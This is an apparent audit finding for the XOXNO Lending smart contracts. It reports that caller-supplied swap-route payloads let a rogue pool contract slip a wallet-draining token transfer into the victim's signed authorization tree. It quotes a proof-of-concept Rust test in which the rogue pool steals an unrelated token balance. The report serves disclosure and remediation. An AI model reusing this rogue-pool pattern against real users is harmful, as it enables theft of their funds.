### Title
Attacker-crafted swap route injects arbitrary calls under the victim's auth tree, draining unrelated wallet tokens - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
The CVE-2025-8715 class is "improper neutralization of attacker-controlled data that is later executed with the victim's privileges": a crafted pg_dump object name injects psql meta-commands run under the restoring client's account. The analog in XOXNO Lending is the swap-route payload: `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept caller-supplied route bytes; the router invokes whatever pool and token addresses the payload names with no allowlist, so injected venue code runs *below the caller's authorization* and can attach arbitrary child calls — e.g. `token.transfer(victim, attacker, x)` on any token the victim holds — to the auth tree the victim signs.

### Finding Description
`swap_tokens` in `contracts/controller/src/strategies/swap.rs` authorizes exactly one input transfer to the configured router via `authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in)` and then calls `router.execute_strategy(&controller, &amount_in, swap)` where `swap` is the caller-supplied `StrategySwap` XDR payload [1](#0-0) . The payload's `assets` registry carries raw `Address` values that the router dereferences for every hop: `dispatch_hop` calls the venue adapter, which invokes the pool address taken straight from the payload registry (e.g. `env.invoke_contract(pool, "swap", ...)` in `contracts/swap-aggregator/src/venues/aquarius/pool.rs:34`). The threat model confirms "the router calls the pool and token addresses its payload names and keeps no allowlist of them" [2](#0-1) .

Because the victim's signature covers the whole root invocation (`controller.swap_collateral(...)` for the direct strategy path, or `router.execute_strategy(...)` for a direct router call), any `require_auth` the injected pool contract performs on the victim's address is recorded as a child of that signed entry and executes if the victim signs the simulated tree. The PoC test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows a rogue "pool" named by the route calling `token::Client::transfer(&alice, &attacker, WALLET_BALANCE)` on a token the protocol never listed; simulation attaches it as a child of Alice's `swap_collateral` entry, and once signed the transfer executes [3](#0-2) [4](#0-3) . The companion test `source_account_credentials_bind_the_rogue_transfer_to_the_tree...` proves the host accepts the forged child whenever it is included in the signed tree [5](#0-4) .

### Impact Explanation
Theft of user funds: a victim who signs a `swap_collateral`/`swap_debt`/`repay_debt_with_collateral`/`multiply` transaction carrying a malicious route loses any token balance in their wallet, not just the routed input — the test drains `WALLET_BALANCE` of an unlisted token to the attacker while the swap itself settles normally with a fair output [6](#0-5) . Neither the payload `min_out` nor the controller's measured-output and final-risk gates bound the loss, per the threat model itself [7](#0-6) .

### Likelihood Explanation
Requires phishing a victim into signing a crafted route (or a compromised/malicious quote source supplying route bytes), and requires the victim's wallet to sign the expanded auth tree — clients that decode routes and reject unexpected child invocations block it, as the docs prescribe. Since exploitation needs a signed-but-poisoned auth tree rather than a purely permissionless path, Medium severity is appropriate: reachable by an unprivileged attacker submitting `swap` bytes as a normal argument, with a social/signing precondition.

### Recommendation
The clean fix mirrors the CVE fix (neutralize at the point of emission): allowlist venue pool/token addresses the router will invoke, or have venue adapters resolve pool addresses only from governance-registered listings instead of the payload registry. Short of that, `dispatch_hop` could require that no `require_auth` on the original `sender` is satisfiable below the router frame — practically, the router should wrap venue calls so nested `require_auth` on `sender` cannot piggyback on the caller's entry (not directly expressible today, which is why the allowlist is the realistic fix). The controller-side measured-delta checks in `swap.rs` cannot detect this class, since the stolen transfer never touches the controller's balances.

### Proof of Concept
Self-contained in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: an `UnlistedPoolRouter` double invokes `route.hop_pool.swap()` from the payload [8](#0-7) ; `RogueHopPool::swap` transfers the victim's unrelated `wallet_token` to the attacker [9](#0-8) ; the test records the stolen transfer as a child of Alice's signed `swap_collateral` entry and asserts Alice's wallet is drained while the swap output still lands [10](#0-9) . The production router is equivalent: payload `assets` entries are unvalidated `Address` values invoked by venue adapters (`aquarius/pool.rs:34`, analogous adapters for Soroswap/Phoenix/Sushi/Comet), so any payload-conformant contract lands on the call stack beneath the victim's authorization.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L363-367)
```rust
    let transfer_args: Vec<Val> = (wallet.clone(), attacker.clone(), 99i128).into_val(&env);
    let child = contract_fn(&env, &wallet_token, "transfer", transfer_args, std::vec![]);
    env.set_auths(&[as_source_account(std::vec![child])]);
    client.run(&wallet, &rogue_pool);
    assert_eq!(token.moved(), Some((attacker, 99)));
```
